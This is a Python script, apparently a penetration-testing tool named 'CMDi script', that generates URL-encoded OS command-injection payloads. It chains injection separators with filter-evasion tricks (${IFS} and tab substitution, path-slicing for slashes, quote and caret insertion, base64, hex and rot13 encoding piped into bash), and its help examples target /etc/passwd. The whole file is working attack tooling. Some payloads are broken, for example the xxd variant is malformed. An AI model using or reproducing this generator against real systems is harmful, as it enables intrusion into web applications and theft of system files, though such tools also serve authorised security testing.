import sys
import base64
import binascii
import codecs
import random
from colorama import *


def print_error(message):
    print(f"[{Fore.RED}ERROR{Style.RESET_ALL}] {message}")


def print_warning(message):
    print(f"[{Fore.YELLOW}WARNING{Style.RESET_ALL}] {message}")


def print_info(message):
    print(f"[{Fore.BLUE}INFO{Style.RESET_ALL}] {message}")


def print_payload(message):
    return f"{Fore.CYAN}{message}{Style.RESET_ALL}"


def randomize_case(commandName):
    return ''.join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(commandName))


def is_int(value):
    try:
        int(value)
        return True
    except ValueError:
        return False


def replaceSpaces_IFS(command: str):
    s = ""
    for e in command:
        if e == " ":
            s += "${IFS}"
        else:
            s += e
    return s


def replaceSpaces_09(command: str):
    s = ""
    for e in command:
        if e == " ":
            s += "%09"
        else:
            s += e
    return s


def replaceSlashs(command: str):
    s = ""
    for e in command:
        if e == "/":
            s += "${PATH:0:1}"
        else:
            s += e
    return s


def pushInjectionParameter(cmd):
    cmds = []
    injects = ["%3b", "%0a", "%26", "%7c", "%26%26", "%7c%7c", "%60%60", "%24%28%29"]  # ;, \n, &, |, &&, ||, ``, $()
    for e in injects:
        cmds.append(f"{e}{cmd}")
    return cmds


def runL1(payloads: list, cmd: str):
    cmds = pushInjectionParameter(cmd)  # get all possible commands with the injection parameter

    # One by one :
    # payloads.append(replaceSpaces_IFS(cmd))
    # payloads.append(replaceSpaces_09(cmd))
    # payloads.append(replaceSlashs(cmd))

    # Mixed :
    for c in cmds:
        payloads.append(replaceSlashs(replaceSpaces_IFS(c)))
        payloads.append(replaceSlashs(replaceSpaces_09(c)))


def runL2_doubleQuote(payloads: list, cmd: str):
    command = cmd.split(" ")
    commandName = command[0]

    if len(commandName) > 2:
        commandName = commandName[0] + ''.join(['"' + char + '"' for char in commandName[1:-1]]) + commandName[-1]

    command[0] = commandName
    command = ' '.join(command)
    cmds = pushInjectionParameter(command)  # get all possible commands with the injection parameter
    for c in cmds:
        payloads.append(replaceSlashs(replaceSpaces_IFS(c)))
        payloads.append(replaceSlashs(replaceSpaces_09(c)))


def runL2_simpleQuote(payloads: list, cmd: str):
    command = cmd.split(" ")
    commandName = command[0]

    if len(commandName) > 2:
        commandName = commandName[0] + ''.join(["'" + char + "'" for char in commandName[1:-1]]) + commandName[-1]

    command[0] = commandName
    command = ' '.join(command)
    cmds = pushInjectionParameter(command)  # get all possible commands with the injection parameter
    for c in cmds:
        payloads.append(replaceSlashs(replaceSpaces_IFS(c)))
        payloads.append(replaceSlashs(replaceSpaces_09(c)))


def runL2_antislash(payloads: list, cmd: str):
    command = cmd.split(" ")
    commandName = command[0]

    if len(commandName) > 2:
        commandName = commandName[0] + ''.join(['\\' + char + '\\' for char in commandName[1:-1]]) + commandName[-1]

    command[0] = commandName
    command = ' '.join(command)
    cmds = pushInjectionParameter(command)  # get all possible commands with the injection parameter
    for c in cmds:
        payloads.append(replaceSlashs(replaceSpaces_IFS(c)))
        payloads.append(replaceSlashs(replaceSpaces_09(c)))


def runL2_linuxspecial(payloads: list, cmd: str):
    command = cmd.split(" ")
    commandName = command[0]

    if len(commandName) > 2:
        commandName = commandName[0] + ''.join(['$@' + char + '$@' for char in commandName[1:-1]]) + commandName[-1]

    command[0] = commandName
    command = ' '.join(command)
    cmds = pushInjectionParameter(command)  # get all possible commands with the injection parameter
    for c in cmds:
        payloads.append(replaceSlashs(replaceSpaces_IFS(c)))
        payloads.append(replaceSlashs(replaceSpaces_09(c)))


def runL2_windowsspecial(payloads: list, cmd: str):
    command = cmd.split(" ")
    commandName = command[0]

    if len(commandName) > 2:
        commandName = commandName[0] + ''.join(['^' + char + '^' for char in commandName[1:-1]]) + commandName[-1]

    command[0] = commandName
    command = ' '.join(command)
    cmds = pushInjectionParameter(command)  # get all possible commands with the injection parameter
    for c in cmds:
        payloads.append(replaceSlashs(replaceSpaces_IFS(c)))
        payloads.append(replaceSlashs(replaceSpaces_09(c)))


def runL2_upperlower(payloads: list, cmd: str):
    command = cmd.split(" ")
    commandName = command[0]

    commandName = randomize_case(commandName)

    command[0] = commandName
    command = ' '.join(command)
    cmds = pushInjectionParameter(command)
    for c in cmds:
        payloads.append(replaceSlashs(replaceSpaces_IFS(c)))
        payloads.append(replaceSlashs(replaceSpaces_09(c)))


def runL3_base64(payloads: list, cmd: str):
    # bash<<<$(base64 -d<<< <cmd encoded base64>)
    command = cmd.split(" ")
    commandName = command[0]

    if len(commandName) > 2:
        commandName = commandName[0] + ''.join(["'" + char + "'" for char in commandName[1:-1]]) + commandName[-1]

    command[0] = commandName
    command = ' '.join(command)
    encodedCMD = base64.b64encode(command.encode('utf-8')).decode('utf-8')
    formatBashBase64 = 'b"as"h<<<$(base64${IFS}-d<<<'
    cmds = pushInjectionParameter(f"{formatBashBase64}{encodedCMD})")
    for c in cmds:
        payloads.append(c)
    formatBashBase64 = "b'as'h<<<$(base64${IFS}-d<<<"
    cmds = pushInjectionParameter(f"{formatBashBase64}{encodedCMD})")
    for c in cmds:
        payloads.append(c)
    formatBashBase64 = 'b"as"h<<<$(base64%09-d<<<'
    cmds = pushInjectionParameter(f"{formatBashBase64}{encodedCMD})")
    for c in cmds:
        payloads.append(c)
    formatBashBase64 = "b'as'h<<<$(base64%09-d<<<"
    cmds = pushInjectionParameter(f"{formatBashBase64}{encodedCMD})")
    for c in cmds:
        payloads.append(c)


def runL3_xxd(payloads: list, cmd: str):
    # bash<<<$(xxd -p<<< <cmd encoded hexa>)
    command = cmd.split(" ")
    commandName = command[0]

    if len(commandName) > 2:
        commandName = commandName[0] + ''.join(["'" + char + "'" for char in commandName[1:-1]]) + commandName[-1]

    command[0] = commandName
    command = ' '.join(command)
    encodedCMD = binascii.hexlify(command.encode('utf-8')).decode('utf-8')
    formatBashXXD = 'b"as"h<<<$(xxd{IFS}-p<<<'
    cmds = pushInjectionParameter(f"{formatBashXXD}{encodedCMD})")
    for c in cmds:
        payloads.append(c)
    formatBashXXD = "b'as'h<<<$(xxd{IFS}-p<<<"
    cmds = pushInjectionParameter(f"{formatBashXXD}{encodedCMD})")
    for c in cmds:
        payloads.append(c)
    formatBashXXD = 'b"as"h<<<$(xxd%09-p<<<'
    cmds = pushInjectionParameter(f"{formatBashXXD}{encodedCMD})")
    for c in cmds:
        payloads.append(c)
    formatBashXXD = "b'as'h<<<$(xxd%09-p<<<"
    cmds = pushInjectionParameter(f"{formatBashXXD}{encodedCMD})")
    for c in cmds:
        payloads.append(c)


def runL3_rot13_IFS(payloads: list, cmd: str):
    # bash<<<$(tr '[A-Za-z]' '[N-ZA-Mn-za-m]'<<< <cmd encoded hexa>)
    command = cmd.split(" ")
    commandName = command[0]

    if len(commandName) > 2:
        commandName = commandName[0] + ''.join(["'" + char + "'" for char in commandName[1:-1]]) + commandName[-1]

    command[0] = commandName
    command = ' '.join(command)
    command = replaceSpaces_IFS(command)
    encodedCMD = codecs.encode(command, 'rot_13')
    formatBashROT13 = 'b"as"h<<<$(tr${IFS}\'[A-Za-z]\'${IFS}\'[N-ZA-Mn-za-m]\'<<<'
    cmds = pushInjectionParameter(f"{formatBashROT13}{encodedCMD})")
    for c in cmds:
        payloads.append(c)
    formatBashROT13 = "b'as'h<<<$(tr${IFS}\'[A-Za-z]\'${IFS}\'[N-ZA-Mn-za-m]\'<<<"
    cmds = pushInjectionParameter(f"{formatBashROT13}{encodedCMD})")
    for c in cmds:
        payloads.append(c)
    formatBashROT13 = 'b"as"h<<<$(tr%09\'[A-Za-z]\'%09\'[N-ZA-Mn-za-m]\'<<<'
    cmds = pushInjectionParameter(f"{formatBashROT13}{encodedCMD})")
    for c in cmds:
        payloads.append(c)
    formatBashROT13 = "b'as'h<<<$(tr%09\'[A-Za-z]\'%09\'[N-ZA-Mn-za-m]\'<<<"
    cmds = pushInjectionParameter(f"{formatBashROT13}{encodedCMD})")
    for c in cmds:
        payloads.append(c)


def runL3_rot13_09(payloads: list, cmd: str):
    # bash<<<$(tr '[A-Za-z]' '[N-ZA-Mn-za-m]'<<< <cmd encoded hexa>)
    command = cmd.split(" ")
    commandName = command[0]

    if len(commandName) > 2:
        commandName = commandName[0] + ''.join(["'" + char + "'" for char in commandName[1:-1]]) + commandName[-1]

    command[0] = commandName
    command = ' '.join(command)
    command = replaceSpaces_09(command)
    encodedCMD = codecs.encode(command, 'rot_13')
    formatBashROT13 = 'b"as"h<<<$(tr${IFS}\'[A-Za-z]\'${IFS}\'[N-ZA-Mn-za-m]\'<<<'
    cmds = pushInjectionParameter(f"{formatBashROT13}{encodedCMD})")
    for c in cmds:
        payloads.append(c)
    formatBashROT13 = "b'as'h<<<$(tr${IFS}\'[A-Za-z]\'${IFS}\'[N-ZA-Mn-za-m]\'<<<"
    cmds = pushInjectionParameter(f"{formatBashROT13}{encodedCMD})")
    for c in cmds:
        payloads.append(c)
    formatBashROT13 = 'b"as"h<<<$(tr%09\'[A-Za-z]\'%09\'[N-ZA-Mn-za-m]\'<<<'
    cmds = pushInjectionParameter(f"{formatBashROT13}{encodedCMD})")
    for c in cmds:
        payloads.append(c)
    formatBashROT13 = "b'as'h<<<$(tr%09\'[A-Za-z]\'%09\'[N-ZA-Mn-za-m]\'<<<"
    cmds = pushInjectionParameter(f"{formatBashROT13}{encodedCMD})")
    for c in cmds:
        payloads.append(c)


def main():
    init()
    args = []
    payloads = []
    cmd = ""
    level = 1
    fileName = None

    for i, arg in enumerate(sys.argv):
        args.append(arg)

    for i in range(0, len(args)):
        arg = args[i]
        if arg == "-h" or arg == "--help":
            print("""
            Welcome to CMDi script ! This help menu will explain how to use the script to generate payloads. 
            
            Arguments:
            -h, --help: show this help menu
            -l, --level: give a level of payload
            -c, --command: give the command to encode
            -o, --output: send all payloads generated into a file
            
            Examples:
            main.py -l 1 'cat /etc/passwd'
            main.py --level 2 'cat /etc/passwd'
            main.py -l 3 'cat /etc/passwd' -o payloads_cmdi.txt
            """)
            return None

        if arg == "-l" or arg == "--level":
            if i + 1 < len(args) and is_int(args[i + 1]):
                level = int(args[i + 1])
            else:
                print_error("The level is not valid")
                level = 1

        if arg == "-c" or arg == "--command":
            if i + 1 < len(args):
                cmd = args[i + 1]
            else:
                print_error("No command given")

        if arg == "-o" or arg == "--output":
            if i + 1 < len(args):
                fileName = args[i + 1]
            else:
                print_error("No file given")

    if level > 3 or level <= 0:
        print_error("The level is not valid, using default level (1).")
        level = 1

    if len(cmd) == 0:
        print_error("No command given")

    print_info(f"Command: {cmd}")

    print_warning("The payloads generated have to be in an URL and not in your terminal!")

    if level >= 1:
        print_info("Generating payloads for level 1.")
        runL1(payloads, cmd)
        print_info("Payloads (level 1) generated with success !")

    if level >= 2:
        print_info("Generating payloads for level 2.")
        runL2_doubleQuote(payloads, cmd)
        runL2_simpleQuote(payloads, cmd)
        runL2_antislash(payloads, cmd)
        runL2_linuxspecial(payloads, cmd)
        runL2_windowsspecial(payloads, cmd)
        runL2_upperlower(payloads, cmd)
        print_info("Payloads (level 2) generated with success !")

    if level == 3:
        print_info("Generating payloads for level 3.")
        runL3_base64(payloads, cmd)
        runL3_xxd(payloads, cmd)
        runL3_rot13_09(payloads, cmd)
        runL3_rot13_IFS(payloads, cmd)
        print_info("Payloads (level 3) generated with success !")

    for c in payloads:
        if " " in c:
            print_warning("Spaces in the command")

    print_warning("Some payloads may be wrong, nonfunctional!")

    if fileName is None:
        i = 0
        for pay in payloads:
            print(f"Payload {i}: {print_payload(pay)}")
            i += 1
    else:
        print_info(f"Writing payloads into the file {fileName}")

        with open(fileName, "w+") as file:
            for p in payloads:
                file.write(p)
                file.write("\n")

        print_info(f"The file '{fileName}' is ready :)!")


if __name__ == "__main__":
    main()
